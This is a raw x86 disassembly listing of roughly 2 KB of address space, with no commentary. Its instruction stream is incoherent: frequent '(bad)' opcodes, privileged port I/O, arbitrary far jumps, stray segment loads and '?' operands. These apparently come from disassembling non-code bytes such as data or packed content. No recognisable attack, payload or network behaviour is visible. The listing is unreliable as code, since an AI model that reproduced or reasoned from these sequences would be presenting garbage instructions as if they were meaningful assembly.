  42192b:	xchg   edx,eax
  42192c:	clc    
  42192d:	sbb    DWORD PTR [ebp+edx*8-0x62],ecx
  421931:	push   edi
  421932:	les    edi,FWORD PTR [esp+eax*1]
  421935:	mov    bl,0x6
  421937:	cmp    eax,0x53ab0337
  42193c:	or     DWORD PTR [eax],ebx
  42193e:	loope  0x4219b6
  421940:	xchg   esp,eax
  421941:	pushf  
  421942:	mov    ch,0x10
  421944:	cmp    dl,ah
  421946:	xor    DWORD PTR [edi],eax
  421948:	mov    gs,WORD PTR [edi+0x7]
  42194b:	mov    ah,0x87
  42194d:	leave  
  42194e:	add    DWORD PTR [ecx-0x174d1bda],eax
  421954:	out    dx,eax
  421955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421956:	dec    edx
  421957:	xchg   DWORD PTR [esp+eax*4],edx
  42195a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42195b:	cs push 0xce9737b9
  421961:	pop    edi
  421962:	sub    bl,bl
  421964:	mov    DWORD PTR [edx-0x7936728b],edi
  42196a:	inc    ecx
  42196b:	mov    ch,0x7f
  42196d:	leave  
  42196e:	adc    dh,BYTE PTR ds:0x692a8f9
  421974:	pop    edx
  421975:	mov    DWORD PTR [eax],esi
  421977:	lods   eax,DWORD PTR ds:[esi]
  421978:	and    DWORD PTR [ebp+ecx*4-0x42e60323],ebx
  42197f:	pop    ecx
  421980:	xchg   esp,eax
  421981:	push   0x7c9ad122
  421986:	cmp    eax,0x6b6b65b8
  42198b:	loope  0x421921
  42198d:	test   BYTE PTR [esi-0xf6e968],dl
  421993:	lahf   
  421994:	sub    al,0xab
  421996:	xor    BYTE PTR [esi+0x5f],bh
  421999:	in     al,dx
  42199a:	loope  0x421a00
  42199c:	dec    ecx
  42199d:	mov    ds:0xccdedafb,al
  4219a2:	ret    
  4219a3:	hlt    
  4219a4:	jb     0x421958
  4219a6:	adc    esp,DWORD PTR [eax]
  4219a8:	je     0x4219e1
  4219aa:	call   0x54cd8f99
  4219af:	aam    0xf8
  4219b1:	jge    0x4219ea
  4219b3:	lods   eax,DWORD PTR ds:[esi]
  4219b4:	mov    esi,0xf5462a9e
  4219b9:	daa    
  4219ba:	mov    ds:0x16da96ac,eax
  4219bf:	mov    bl,0x32
  4219c1:	or     al,0x67
  4219c3:	out    0x5c,al
  4219c5:	call   0xaf7e:0xad060a85
  4219cc:	or     esp,DWORD PTR [edi]
  4219ce:	or     eax,0xa90194e0
  4219d3:	mov    edi,0x8bae6808
  4219d8:	lea    edi,[ecx+0x70]
  4219db:	push   0xffffffd3
  4219dd:	add    bl,BYTE PTR [esi]
  4219df:	loopne 0x4219ee
  4219e1:	outs   dx,DWORD PTR ds:[esi]
  4219e2:	shl    DWORD PTR [eax-0x2e65adbe],cl
  4219e8:	or     edx,eax
  4219ea:	pop    edx
  4219eb:	jo     0x421a34
  4219ed:	aaa    
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	or     DWORD PTR [ebx],ebx
  421a64:	outs   dx,DWORD PTR fs:[esi]
  421a66:	imul   eax,DWORD PTR [bx+di],0x10000
  421a6d:	add    BYTE PTR [ecx-0x5a],cl
  421a70:	push   esi
  421a71:	jecxz  0x421a4f
  421a73:	or     al,0xd9
  421a75:	mov    al,ds:0x33e56d30
  421a7a:	test   eax,0x8179e50d
  421a7f:	adc    eax,0x757d0eb8
  421a84:	jns    0x421b01
  421a86:	xor    bh,cl
  421a88:	or     ebx,edi
  421a8a:	in     al,0x6d
  421a8c:	inc    esi
  421a8d:	adc    BYTE PTR [ebp+0x3e62e8b1],bl
  421a93:	mov    esi,0x900796ab
  421a98:	pop    ecx
  421a99:	jmp    DWORD PTR [ebp+0x1]
  421a9c:	std    
  421a9d:	mov    eax,DWORD PTR [edi*8-0x6ee99dfa]
  421aa4:	lods   al,BYTE PTR ds:[esi]
  421aa5:	fdivr  DWORD PTR [eax-0x31da284a]
  421aab:	rol    DWORD PTR [ecx],0x43
  421aae:	xor    edi,DWORD PTR [esi-0x6b]
  421ab1:	test   DWORD PTR [edi],ebx
  421ab3:	fist   WORD PTR [esi+edx*8+0x70a3f81a]
  421aba:	and    bl,BYTE PTR [edi+0x5f]
  421abd:	add    al,0x37
  421abf:	shr    DWORD PTR [edx-0x12],cl
  421ac2:	xchg   esp,eax
  421ac3:	mov    dh,BYTE PTR [eax+ecx*4-0x3ae6610]
  421aca:	jmp    0x421a75
  421acc:	fistp  WORD PTR [ecx-0x1d]
  421acf:	jl     0x421b2d
  421ad1:	jne    0x421aa9
  421ad3:	add    bl,bl
  421ad5:	jns    0x421a9f
  421ad7:	cmc    
  421ad8:	sbb    ecx,DWORD PTR [esi+0x70ca471f]
  421ade:	cmp    bh,ch
  421ae0:	adc    ch,BYTE PTR [ebp-0x1a789f01]
  421ae6:	imul   ebx,DWORD PTR [ebp+0x35],0x672521d0
  421aed:	pop    ss
  421aee:	add    BYTE PTR [esp+eax*4],dl
  421af1:	enter  0xa80b,0xdc
  421af5:	popa   
  421af6:	test   al,0x3c
  421af8:	mov    dh,0xce
  421afa:	push   ss
  421afb:	mov    edx,DWORD PTR ds:0x9102f50
  421b01:	cmp    al,0xbb
  421b03:	push   ecx
  421b04:	xchg   edi,eax
  421b05:	rcl    ebp,cl
  421b07:	cmc    
  421b08:	xor    BYTE PTR [ebp-0x226cd3e8],ch
  421b0e:	fsub   DWORD PTR [esi]
  421b10:	push   edx
  421b11:	(bad)  
  421b12:	cs push cs
  421b14:	(bad)  
  421b15:	icebp  
  421b16:	dec    ebx
  421b17:	or     DWORD PTR [eax+0x4d7182cf],edx
  421b1d:	mov    ebp,0x7081bc97
  421b22:	and    BYTE PTR [eax+0x54],0x79
  421b26:	repnz lods al,BYTE PTR ds:[esi]
  421b28:	pusha  
  421b29:	rol    DWORD PTR [esp+ecx*2],cl
  421b2c:	and    esi,DWORD PTR gs:[eax-0x75]
  421b30:	hlt    
  421b31:	psllw  mm0,mm0
  421b34:	mov    ebp,edi
  421b36:	cmp    bl,BYTE PTR ds:0x34278034
  421b3c:	pop    edx
  421b3d:	or     dl,BYTE PTR [edx]
  421b3f:	add    DWORD PTR [ebp-0x76],0x7997202
  421b46:	out    0x3d,al
  421b48:	mov    ah,0xbd
  421b4a:	xchg   esi,eax
  421b4b:	nop
  421b4c:	mov    BYTE PTR [ecx+0x1fa03090],al
  421b52:	gs jmp 0x17d9d64
  421b58:	inc    esp
  421b59:	fdiv   DWORD PTR [eax+0x1b]
  421b5c:	adc    DWORD PTR [esi],0x6ab033fc
  421b62:	adc    al,0xa4
  421b64:	adc    eax,0x7ef021ce
  421b69:	mov    bh,0x77
  421b6b:	and    esp,DWORD PTR [bp+di]
	...
  421bd6:	push   ss
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     bl,dh
  421be3:	cmp    ah,BYTE PTR [edi]
  421be5:	(bad)  
  421be6:	addr16 push 0x1
  421be9:	add    BYTE PTR [eax],al
  421beb:	add    DWORD PTR [eax],eax
  421bed:	add    BYTE PTR [esi-0x49],bh
  421bf0:	loopne 0x421c58
  421bf2:	push   es
  421bf3:	pop    ebp
  421bf4:	aas    
  421bf5:	pop    ebx
  421bf6:	fdivr  QWORD PTR [edi-0x25]
  421bf9:	mov    bl,0x73
  421bfb:	push   esp
  421bfc:	outs   dx,BYTE PTR ds:[esi]
  421bfd:	and    eax,0x72fcb678
  421c02:	pop    ebp
  421c03:	rcr    DWORD PTR ds:0xd351d677,cl
  421c09:	jae    0x421c2a
  421c0b:	mov    al,ds:0x66f447b5
  421c10:	adc    al,0x13
  421c12:	int    0x59
  421c14:	cs fwait
  421c16:	clc    
  421c17:	or     di,WORD PTR [edx-0x58]
  421c1b:	js     0x421c4f
  421c1d:	jg     0x421ba7
  421c1f:	jmp    0x73a0:0xf962fa81
  421c26:	cmp    eax,0xc7091498
  421c2b:	test   al,0xa4
  421c2d:	inc    ebp
  421c2e:	and    eax,0x1fc98aae
  421c33:	jae    0x421c9a
  421c35:	sbb    BYTE PTR [edx+ecx*8-0x467e1646],0xd5
  421c3d:	push   edi
  421c3e:	rol    DWORD PTR [ebx-0x3f461347],1
  421c44:	inc    esi
  421c45:	(bad)  
  421c46:	in     eax,dx
  421c47:	inc    ebp
  421c48:	xchg   esi,eax
  421c49:	cmp    al,0x65
  421c4b:	xor    al,0x8c
  421c4d:	shl    BYTE PTR [eax+0x54],0xff
  421c51:	scas   al,BYTE PTR es:[edi]
  421c52:	pop    edx
  421c53:	fnstcw WORD PTR [ebp+0x6b]
  421c56:	mov    bh,0x85
  421c58:	sub    DWORD PTR [esi],0xffffff94
  421c5b:	in     eax,dx
  421c5c:	bound  ebp,QWORD PTR [edi]
  421c5e:	hlt    
  421c5f:	aas    
  421c60:	inc    ecx
  421c61:	in     al,0x75
  421c63:	or     al,BYTE PTR [edi]
  421c65:	cmp    al,0x34
  421c67:	mov    dl,0x8e
  421c69:	push   edi
  421c6a:	add    eax,0xdecf4189
  421c6f:	mov    edi,0x80faa8a
  421c74:	push   eax
  421c75:	jmp    0x421c9f
  421c77:	dec    ebp
  421c78:	mov    ebx,0xd440300e
  421c7d:	rol    esi,1
  421c7f:	fistp  QWORD PTR [eax]
  421c81:	shr    BYTE PTR [edx],cl
  421c83:	jge    0x421c71
  421c85:	xchg   ecx,eax
  421c86:	and    al,0xf9
  421c88:	jmp    0x421ca2
  421c8a:	mov    bh,0x8f
  421c8c:	fs pop ds
  421c8e:	lds    esi,FWORD PTR [edi+0x55565539]
  421c94:	pop    eax
  421c95:	jno    0x421c3e
  421c97:	in     al,0x18
  421c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c9a:	(bad)  
  421c9b:	pop    ebp
  421c9c:	ret    0xff1f
  421c9f:	leave  
  421ca0:	push   eax
  421ca1:	mov    ecx,0x773f316e
  421ca6:	mov    ecx,0x73142d7c
  421cab:	push   esi
  421cac:	add    esp,DWORD PTR [ebp+0x7d]
  421caf:	fnstenv [eax]
  421cb1:	clc    
  421cb2:	(bad)  
  421cb4:	xchg   esp,eax
  421cb5:	jmp    0x421d2e
  421cb7:	test   eax,0xd6fe7b02
  421cbc:	sbb    DWORD PTR [esi],ebx
  421cbe:	mov    ah,dl
  421cc0:	mov    ebp,0x5980bc7
  421cc5:	sahf   
  421cc6:	or     BYTE PTR [edx-0x4b017906],bh
  421ccc:	out    0x48,al
  421cce:	jl     0x421cbf
  421cd0:	bound  eax,QWORD PTR [edi]
  421cd2:	push   cs
  421cd3:	xchg   ebp,eax
  421cd4:	inc    eax
  421cd5:	ja     0x421d54
  421cd7:	fwait
  421cd8:	pop    esp
  421cd9:	mov    ds:0x28664ca9,al
  421cde:	mov    edx,0xf9c4528c
  421ce3:	cmp    BYTE PTR [ecx+ecx*2],dl
  421ce6:	jmp    0x50e4:0x4ab217e1
  421ced:	mov    edi,0x0
	...
  421d56:	mov    al,0x6b
  421d58:	mov    ch,0xe5
  421d5a:	(bad)  
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	lahf   
  421d63:	out    dx,eax
  421d64:	push   edi
  421d65:	mov    eax,0x16b67
  421d6a:	add    BYTE PTR [ecx],al
  421d6c:	add    BYTE PTR [eax],al
  421d6e:	mov    cl,BYTE PTR [ecx+0x18faf437]
  421d74:	adc    BYTE PTR [esp+eax*1],ah
  421d77:	in     eax,0x89
  421d79:	pusha  
  421d7a:	push   ebp
  421d7b:	mov    DWORD PTR [ebx-0x51a555dc],ebx
  421d81:	mov    ebp,0xc1a56229
  421d86:	ins    DWORD PTR es:[edi],dx
  421d87:	xor    eax,0xaf161ecd
  421d8c:	nop
  421d8d:	in     al,dx
  421d8e:	outs   dx,DWORD PTR ds:[esi]
  421d8f:	jnp    0x421d87
  421d91:	in     al,0xf5
  421d93:	fwait
  421d94:	jnp    0x421e09
  421d96:	stos   BYTE PTR es:[edi],al
  421d97:	jbe    0x421dd1
  421d99:	repz les ebp,FWORD PTR [ebp+0x6be92be5]
  421da0:	sbb    eax,0xc9f5f4d0
  421da5:	push   edx
  421da6:	ja     0x421e0d
  421da8:	scas   al,BYTE PTR es:[edi]
  421da9:	xchg   dh,ch
  421dab:	outs   dx,BYTE PTR ds:[esi]
  421dac:	xchg   ebx,eax
  421dad:	rcl    DWORD PTR [eax+0x11],1
  421db0:	imul   edi,DWORD PTR [ebx+0x18840d1],0x59
  421db7:	imul   esp,DWORD PTR [edi],0x750c449b
  421dbd:	jb     0x421dbc
  421dbf:	lahf   
  421dc0:	shl    DWORD PTR [edx-0x684963d3],1
  421dc6:	inc    ebx
  421dc7:	xchg   ebp,eax
  421dc8:	mov    WORD PTR [edi-0x6f649d48],fs
  421dce:	rcl    DWORD PTR [ebx],1
  421dd0:	fld    QWORD PTR [ebp+0x1c883c61]
  421dd6:	int    0xca
  421dd8:	xchg   esp,eax
  421dd9:	xchg   edx,eax
  421dda:	dec    edx
  421ddb:	pop    ecx
  421ddc:	push   ds
  421ddd:	sti    
  421dde:	jmp    0x4ed9:0x4e739bd7
  421de5:	mov    WORD PTR [edx-0x2b47f6d0],es
  421deb:	sbb    esp,DWORD PTR [ebx+0x61]
  421dee:	mov    ecx,DWORD PTR [ecx]
  421df0:	mov    ebp,0x580801c5
  421df5:	inc    ecx
  421df6:	ret    0x4557
  421df9:	adc    eax,0x41fdf03a
  421dfe:	adc    dh,0xd4
  421e01:	repnz popf 
  421e03:	(bad)  
  421e04:	ja     0x421dd0
  421e06:	mov    ds:0xe8a7ab9b,al
  421e0b:	hlt    
  421e0c:	std    
  421e0d:	jmp    0x421e41
  421e0f:	or     al,0xe
  421e11:	push   cs
  421e12:	in     eax,0xea
  421e14:	and    al,0x9b
  421e16:	pop    ebx
  421e17:	loop   0x421e09
  421e19:	xlat   BYTE PTR ds:[ebx]
  421e1a:	xor    eax,0x9e4543e9
  421e1f:	inc    ecx
  421e20:	jne    0x421ded
  421e22:	enter  0x2b8b,0x0
  421e26:	imul   esp,DWORD PTR [edi],0xe3a3256a
  421e2c:	clc    
  421e2d:	mov    cl,cl
  421e2f:	div    DWORD PTR [eax+eiz*8]
  421e32:	dec    esi
  421e33:	ss xchg edi,eax
  421e35:	mov    bl,BYTE PTR [ecx]
  421e37:	xor    BYTE PTR [esi-0x3c],ah
  421e3a:	sbb    bh,bh
  421e3c:	retf   
  421e3d:	sbb    DWORD PTR [edx-0x71],edx
  421e40:	mov    al,0x2b
  421e42:	out    dx,eax
  421e43:	out    0x9f,eax
  421e45:	sub    BYTE PTR [ebx+ebx*2-0x58ef5f1],dl
  421e4c:	mov    ?,ebx
  421e4e:	or     al,0x62
  421e50:	or     DWORD PTR ds:0xea6c54e2,esi
  421e56:	mov    ebp,0x23bee4b9
  421e5b:	iret   
  421e5c:	push   0xffffffe6
  421e5e:	fs jnp 0x421e9c
  421e61:	xlat   BYTE PTR ds:[ebx]
  421e62:	lods   eax,DWORD PTR ds:[esi]
  421e63:	push   0x16
  421e65:	mov    ds:0xf33c08c7,al
  421e6a:	mov    ds:0xb0110c,al
	...
  421ed3:	add    BYTE PTR [eax],al
  421ed5:	add    bh,cl
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	adc    BYTE PTR [edi],ah
  421ee4:	push   eax
  421ee5:	adc    al,0x67
  421ee7:	ins    BYTE PTR es:[edi],dx
  421ee8:	add    DWORD PTR [eax],eax
  421eea:	add    BYTE PTR [ecx],al
  421eec:	add    BYTE PTR [eax],al
  421eee:	ins    BYTE PTR es:[edi],dx
  421eef:	xlat   BYTE PTR ds:[ebx]
  421ef0:	mov    DWORD PTR [ecx-0x75],esp
  421ef3:	cmp    eax,0xb4c77ed9
  421ef8:	lds    esi,FWORD PTR ds:0x866794d3
  421efe:	lods   eax,DWORD PTR ds:[esi]
  421f00:	test   dl,dh
  421f02:	(bad)
  421f05:	adc    al,0x7d
  421f07:	mov    esp,0x72ef9ffe
  421f0c:	js     0x421eb6
  421f0e:	adc    DWORD PTR [ebx-0x559d000e],esp
  421f14:	sbb    BYTE PTR [ecx-0x62],cl
  421f17:	fdivr  DWORD PTR [ebx+ebx*1+0x359a5f90]
  421f1e:	xchg   esi,esp
  421f20:	cmp    DWORD PTR [edi+ecx*1],esi
  421f23:	shr    BYTE PTR [esi-0x33abbe4f],1
  421f29:	sbb    eax,DWORD PTR [edx+eiz*4+0x48]
  421f2d:	pop    eax
  421f2e:	inc    edi
  421f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f30:	data16 mov bh,0xc9
  421f33:	lock fdiv st,st(4)
  421f36:	mov    BYTE PTR [eax+0x29fc61ee],bl
  421f3c:	aam    0xf4
  421f3e:	mov    esi,0x22917d
  421f43:	and    al,0x53
  421f45:	sti    
  421f46:	add    DWORD PTR [edi-0x34],esi
  421f49:	es and eax,0xa58250f2
  421f4f:	icebp  
  421f50:	aas    
  421f51:	scas   al,BYTE PTR es:[edi]
  421f52:	push   ss
  421f53:	pop    ebp
  421f54:	std    
  421f55:	les    esi,FWORD PTR [esp+edi*4+0x71]
  421f59:	cli    
  421f5a:	jp     0x421f59
  421f5c:	adc    eax,0xb2fe1b1f
  421f61:	mov    ebp,DWORD PTR [edx+0x4c]
  421f64:	jne    0x421fcf
  421f66:	jae    0x421f16
  421f68:	push   0xb589234
  421f6d:	jnp    0x421f82
  421f6f:	icebp  
  421f70:	xchg   al,bl
  421f72:	es inc esp
  421f74:	fld    st(4)
  421f76:	in     eax,0x3
  421f78:	mov    DWORD PTR [eax],esi
  421f7a:	sbb    edx,DWORD PTR [edx]
  421f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f7d:	int    0xe2
  421f7f:	aad    0xd2
  421f81:	inc    ecx
  421f82:	sub    esp,DWORD PTR ds:0x2df62956
  421f88:	inc    ebp
  421f89:	sahf   
  421f8a:	fdiv   QWORD PTR [edx]
  421f8c:	mov    bh,0x8c
  421f8e:	sbb    edx,DWORD PTR [eax-0x12f79ad3]
  421f94:	pop    ss
  421f95:	mov    eax,0xa4654436
  421f9a:	dec    esp
  421f9b:	fst    DWORD PTR [edi]
  421f9d:	std    
  421f9e:	and    eax,0x4f9d39c3
  421fa3:	mov    esp,0x7d36a783
  421fa8:	jmp    0xb29203e8
  421fad:	and    BYTE PTR [ebx+ecx*8+0x77],cl
  421fb1:	retf   0xab3d
  421fb4:	mov    esi,0x22849c76
  421fb9:	int3   
  421fba:	repnz push esi
  421fbc:	loop   0x421f7d
  421fbe:	jno    0x421fd8
  421fc0:	add    esi,DWORD PTR [edx]
  421fc2:	(bad)  
  421fc3:	rol    DWORD PTR [ecx],cl
  421fc5:	jnp    0x421f8d
  421fc7:	leave  
  421fc8:	mov    edx,0x559be621
  421fcd:	ins    BYTE PTR es:[edi],dx
  421fce:	addr16 mov bh,0xcd
  421fd1:	iret   
  421fd2:	and    dh,al
  421fd4:	push   ebp
  421fd5:	sub    al,dl
  421fd7:	mov    ecx,0x168c33ae
  421fdc:	dec    ecx
  421fdd:	out    0x9b,al
  421fdf:	mov    ds:0x11efe601,al
  421fe4:	adc    eax,0x43dce709
  421fe9:	mov    DWORD PTR [ecx+0x36],ebp
  421fec:	jp     0x421fc5
	...
  422056:	imul   eax,DWORD PTR [esi],0xffffff8f
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	data16 cmp dl,al
  422064:	test   dl,dh
  422066:	ins    DWORD PTR es:[di],dx
  422068:	add    DWORD PTR [eax],eax
  42206a:	add    BYTE PTR [ecx],al
  42206c:	add    BYTE PTR [eax],al
  42206e:	jp     0x4220a1
  422070:	cmc    
  422071:	retf   0x8761
  422074:	aam    0x29
  422076:	dec    esi
  422077:	sub    BYTE PTR ss:[eax],dh
  42207a:	pop    edx
  42207b:	dec    edi
  42207c:	jae    0x422078
  42207e:	dec    DWORD PTR [eax-0x5d]
  422081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422082:	fcomp  st(1)
  422084:	fild   WORD PTR [ecx-0x9]
  422087:	inc    esp
  422088:	fsub   DWORD PTR [edi-0x10]
  42208b:	outs   dx,BYTE PTR ds:[esi]
  42208c:	pop    es
  42208d:	scas   al,BYTE PTR es:[edi]
  42208e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42208f:	push   ecx
  422090:	out    0x77,al
  422092:	xchg   DWORD PTR [edx-0x6b],esp
  422095:	xchg   ebx,eax
  422096:	mov    dh,0xf9
  422098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422099:	ja     0x4220c3
  42209b:	ja     0x4220cb
  42209d:	mov    eax,0xbaa0715b
  4220a2:	mov    ds:0xb39f5979,al
  4220a7:	pushf  
  4220a8:	mov    edi,0x53f0aa2f
  4220ad:	cmp    DWORD PTR [eax+0x263502a6],ecx
  4220b3:	je     0x422056
  4220b5:	clc    
  4220b6:	jmp    0xbe7308a9
  4220bb:	jge    0x422090
  4220bd:	(bad)  
  4220be:	cld    
  4220bf:	xchg   ecx,eax
  4220c0:	(bad)  
  4220c1:	nop
  4220c2:	mov    al,ds:0x6c483670
  4220c7:	push   ebp
  4220c8:	mov    ch,0xd9
  4220ca:	xchg   esi,eax
  4220cb:	in     al,0x8c
  4220cd:	add    bl,BYTE PTR [eax-0x1d]
  4220d0:	add    ebx,DWORD PTR [esi+ecx*1-0x1a2ae441]
  4220d7:	mov    ss,ebx
  4220d9:	sub    ch,BYTE PTR [ecx+0x42]
  4220dc:	in     al,0x6f
  4220de:	out    dx,al
  4220df:	inc    edx
  4220e0:	adc    dh,ah
  4220e2:	imul   edx,DWORD PTR [edi],0x6af58149
  4220e8:	iret   
  4220e9:	jno    0x422088
  4220eb:	(bad)  
  4220ec:	dec    edi
  4220ed:	mov    fs,WORD PTR [edi]
  4220ef:	mov    cl,0xb8
  4220f1:	test   BYTE PTR [edx+0x8],bh
  4220f4:	add    BYTE PTR [ebx-0x29d735cf],bh
  4220fa:	pop    ecx
  4220fb:	call   0x17f7:0xb871c75c
  422102:	xchg   edi,eax
  422103:	push   ss
  422104:	js     0x422162
  422106:	pop    esp
  422107:	cld    
  422108:	mov    ch,0xef
  42210a:	pop    ds
  42210b:	ja     0x422149
  42210d:	arpl   WORD PTR [edx-0x14],cx
  422110:	pusha  
  422111:	xchg   ecx,eax
  422112:	pop    edx
  422113:	jg     0x422112
  422115:	outs   dx,BYTE PTR ds:[esi]
  422116:	loope  0x422141
  422118:	lahf   
  422119:	ds sti 
  42211b:	and    al,0x45
  42211d:	dec    edi
  42211e:	jno    0x422156
  422120:	and    ch,ah
  422122:	and    ch,BYTE PTR [ecx+eiz*1-0x39]
  422126:	sub    al,0xf3
  422128:	outs   dx,DWORD PTR ds:[esi]
  422129:	jbe    0x422197
  42212b:	jp     0x422125
  42212d:	rol    BYTE PTR [edi],0xf9
  422130:	mov    eax,DWORD PTR [ebx+0x4b]
  422133:	push   edi
  422134:	mov    ch,0x39
  422136:	hlt    
  422137:	mov    al,ds:0x544299d8
  42213c:	xchg   DWORD PTR [esi+edx*4],ebp
  42213f:	xor    bh,bl
  422141:	test   eax,0xb71258b1
  422146:	repz daa 
  422148:	mov    bh,0x5f
  42214a:	pop    ebp
  42214b:	add    DWORD PTR [ebp-0x53],edx
  42214e:	not    BYTE PTR [esi]
  422150:	pop    ebp
  422151:	xchg   ecx,eax
  422152:	sub    bl,ah
  422154:	inc    esi
  422155:	pop    ss
  422156:	jp     0x422118
  422158:	cdq    
  422159:	std    
  42215a:	push   edx
  42215b:	iret   
  42215c:	xor    al,0xd
  42215e:	cmp    DWORD PTR [ebx-0x771a0825],esp
  422164:	xchg   BYTE PTR [ecx+0x6c4b6da2],al
  42216a:	cmp    DWORD PTR [esi+0x7979],esp
	...
  4221d4:	add    BYTE PTR [eax],al
  4221d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221d7:	push   edx
  4221d8:	jnp    0x4221d7
  4221da:	(bad)  
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    ecx,DWORD PTR [ebp+0x2c]
  4221e4:	or     esp,DWORD PTR [ecx+0x16e67]
  4221ea:	add    BYTE PTR [ecx],al
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	push   0x58525991
  4221f3:	sub    BYTE PTR [ecx+0x3e8da4c2],bl
  4221f9:	mov    fs,WORD PTR [edx]
  4221fb:	jbe    0x422270
  4221fd:	mov    DWORD PTR [edx],esi
  4221ff:	adc    al,0x23
  422201:	xor    esi,eax
  422203:	inc    esp
  422204:	sbb    al,0xf9
  422206:	mov    ch,0xee
  422208:	popf   
  422209:	into   
  42220a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42220b:	xor    BYTE PTR [ebx-0x71],al
  42220e:	mov    ds:0x7869ef5c,al
  422213:	dec    ecx
  422214:	test   DWORD PTR ds:0xf08e8c65,esi
  42221a:	jecxz  0x422265
  42221c:	xchg   DWORD PTR [eax-0x33],ebx
  42221f:	scas   al,BYTE PTR es:[edi]
  422220:	mov    ecx,ecx
  422222:	(bad)  
  422223:	cmp    cl,dh
  422225:	xlat   BYTE PTR gs:[ebx]
  422227:	data16 and cl,BYTE PTR gs:[eax-0x79]
  42222c:	sub    BYTE PTR [ebx],bl
  42222e:	into   
  42222f:	int    0x50
  422231:	add    esp,ebp
  422233:	data16 das 
  422235:	xor    ah,ch
  422237:	inc    esi
  422238:	lods   al,BYTE PTR ds:[esi]
  422239:	cmp    DWORD PTR [edx+0xdba3b9f],ebp
  42223f:	jmp    DWORD PTR [eax-0x1636530a]
  422245:	es jns 0x422260
  422248:	iret   
  422249:	mov    esp,0xb185d4d9
  42224e:	cwde   
  42224f:	mov    al,0x22
  422251:	jns    0x4221d6
  422253:	fwait
  422254:	jae    0x4222a2
  422256:	add    al,0xef
  422258:	jp     0x4222b9
  42225a:	clc    
  42225b:	xor    DWORD PTR [ebp+0x21fc53da],edi
  422261:	and    dl,BYTE PTR [eax+0x6b230be2]
  422267:	xchg   esi,eax
  422268:	push   ss
  422269:	aaa    
  42226a:	mov    esp,esp
  42226c:	inc    ecx
  42226d:	fidiv  DWORD PTR [ebx-0x606feed2]
  422273:	nop
  422274:	or     edx,DWORD PTR [ebx+0x2e7b0dbc]
  42227a:	mov    edi,0xe1c9a0d2
  42227f:	and    DWORD PTR [edx-0x1e6a9f6e],ecx
  422285:	inc    edx
  422286:	sbb    al,BYTE PTR [edx+ebp*2]
  422289:	ja     0x42229f
  42228b:	inc    edx
  42228c:	and    edx,DWORD PTR [ebx+0x2b]
  42228f:	pop    esp
  422290:	pop    edi
  422291:	das    
  422292:	push   ss
  422293:	push   ds
  422294:	addr16 rcl edi,cl
  422297:	ret    0x68b1
  42229a:	dec    esi
  42229b:	sbb    BYTE PTR [edx],ah
  42229d:	sbb    eax,0xdbd75de9
  4222a2:	mov    WORD PTR [edi],?
  4222a4:	jmp    0x728c0542
  4222a9:	pop    edi
  4222aa:	aas    
  4222ab:	rol    BYTE PTR [edx+0x201dd3f0],cl
  4222b1:	xchg   BYTE PTR [esi],ah
  4222b3:	and    BYTE PTR [ebx+0x60],bl
  4222b6:	je     0x42226e
  4222b8:	mov    bh,0x28
  4222ba:	sar    BYTE PTR [edx+0x64abc3c8],0x2d
  4222c1:	(bad)  
  4222c2:	or     ebp,esi
  4222c4:	pop    esp
  4222c5:	js     0x422308
  4222c7:	pop    esi
  4222c8:	xor    BYTE PTR [edi+0x15],dh
  4222cb:	pusha  
  4222cc:	dec    edx
  4222cd:	repz jmp 0xb848:0xdce109df
  4222d5:	sub    BYTE PTR [eax-0x73],dl
  4222d8:	outs   dx,BYTE PTR ds:[esi]
  4222d9:	shl    BYTE PTR [ecx-0x217073f],0xc3
  4222e0:	int3   
  4222e1:	shl    BYTE PTR [ebp-0x1d6dab79],0x74
  4222e8:	push   eax
  4222e9:	stos   BYTE PTR es:[edi],al
  4222ea:	repz jno 0x4222fb
  4222ed:	and    eax,DWORD PTR [eax]
	...
  422353:	add    BYTE PTR [eax],al
  422355:	add    BYTE PTR [edi-0x10085213],cl
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	adc    edx,DWORD PTR [ecx-0x18]
  422365:	push   esp
  422366:	outs   dx,DWORD PTR ds:[si]
  422368:	add    DWORD PTR [eax],eax
  42236a:	add    BYTE PTR [ecx],al
  42236c:	add    BYTE PTR [eax],al
  42236e:	retf   
  42236f:	add    edi,DWORD PTR [esi-0x48]
  422372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422373:	and    DWORD PTR [ebx-0x40],esp
  422376:	lahf   
  422377:	push   cs
  422378:	pushf  
  422379:	(bad)  
  42237a:	outs   dx,DWORD PTR ds:[esi]
  42237b:	sbb    dh,dl
  42237d:	xchg   esp,eax
  42237e:	cmp    eax,0xc08e8fa0
  422383:	mov    cl,0xdd
  422385:	jbe    0x4223d7
  422387:	sbb    eax,0xfa63d62f
  42238c:	add    eax,0x3a018b2b
  422391:	ret    
